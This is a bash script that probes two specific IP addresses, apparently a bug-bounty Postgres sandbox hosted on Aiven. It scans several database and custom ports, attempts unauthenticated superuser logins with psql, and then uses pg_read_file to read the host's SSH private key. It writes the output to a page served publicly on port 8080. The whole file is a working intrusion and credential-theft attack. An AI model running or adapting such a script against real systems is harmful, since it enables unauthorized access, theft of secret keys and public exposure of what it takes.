#!/bin/bash
# Falcon access attempt: internal trust ports on current + alternate falcon IPs, from this cloud.
mkdir -p /results; OUT=/results/index.html
{
echo "<pre>"; echo "=== FALCON ACCESS PROBE $(date -u) cloud-position ==="
echo "MY IP: $(hostname -i 2>/dev/null)"; ip route 2>/dev/null | head -3
FQ=falcon-bug-bounty-flag-pgsql-dev-sandbox.e.aivencloud.com
echo "FQDN resolves: $(dig +short $FQ | tr '\n' ' ')"
for IP in 129.80.194.150 132.145.191.135; do
  echo "=== TARGET $IP ==="
  for p in 5432 5433 22293 54321 28001 12691 12692; do
    timeout 3 bash -c "echo > /dev/tcp/$IP/$p" 2>/dev/null && echo "OPEN $IP:$p" || echo "closed $IP:$p"
  done
  for p in 5432 22293 54321 28001; do
    echo "--- trust postgres@$IP:$p ---"
    timeout 7 psql "postgresql://postgres@$IP:$p/postgres?connect_timeout=5" -c "SELECT current_user, rolsuper FROM pg_roles WHERE rolname=current_user;" 2>&1
    echo "--- flag read postgres@$IP:$p ---"
    timeout 7 psql "postgresql://postgres@$IP:$p/postgres?connect_timeout=5" -c "SELECT pg_read_file('/etc/ssh/ssh_host_ed25519_key');" 2>&1
  done
done
echo "=== DONE $(date -u) ==="; echo "</pre>"
} > "$OUT" 2>&1
cd /results && exec python3 -m http.server 8080 --bind 0.0.0.0
